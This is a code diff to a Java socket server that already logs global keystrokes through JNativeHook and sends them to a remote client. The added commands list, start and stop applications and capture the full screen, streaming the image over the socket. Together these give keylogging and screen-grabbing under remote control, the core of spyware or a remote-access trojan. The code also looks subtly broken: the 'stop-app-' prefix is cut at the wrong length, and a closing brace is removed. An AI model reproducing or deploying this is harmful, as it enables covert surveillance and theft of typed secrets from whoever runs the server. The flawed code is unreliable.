@@ -4,6 +4,12 @@ import java.net.ServerSocket;
 import java.net.Socket;
 import java.net.http.WebSocket;
 
+import java.awt.*;
+import java.awt.image.BufferedImage;
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import javax.imageio.ImageIO;
+
 import com.github.kwhat.jnativehook.GlobalScreen;
 import com.github.kwhat.jnativehook.NativeHookException;
 import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
@@ -104,8 +110,44 @@ public class Server implements NativeKeyListener{
                     GlobalScreen.removeNativeKeyListener(server);
                     writer.println(keyLoggingResult);
                     writer.flush();
+                    
+                }else if (request.equals("list-apps")) {
+                    List<String> appsList = getAppsList();
+                    writer.println(appsList);
+                    writer.flush();
+                    
+                }else if (request.startsWith("start-app-")) {
+                    String appName = request.substring(10);
+                    boolean success = startApp(appName);
+                    writer.println(success);
+                    writer.flush();
+                    
+                }else if (request.startsWith("stop-app-")) {
+                    String appName = request.substring(10);
+                    boolean success = stopApp(appName);
+                    writer.println(success);
+                    writer.flush();
+                    
+                } else if (request.equals("get-screenshot")) {
+                    try {
+                        Robot robot = new Robot();
+                        Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
+                        BufferedImage screenshot = robot.createScreenCapture(screenRect);
+                
+                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                        ImageIO.write(screenshot, "png", baos);
+                        byte[] screenshotBytes = baos.toByteArray();
+                
+                        writer.println(screenshotBytes.length);
+                        writer.flush();
+                        socket.getOutputStream().write(screenshotBytes);
+                
+                    } catch (AWTException | IOException e) {
+                        e.printStackTrace();
+                        writer.println("Error capturing screenshot.");
+                        writer.flush();
+                    }
                 }
-            }
         } catch (Exception e) {
             e.printStackTrace();
         }
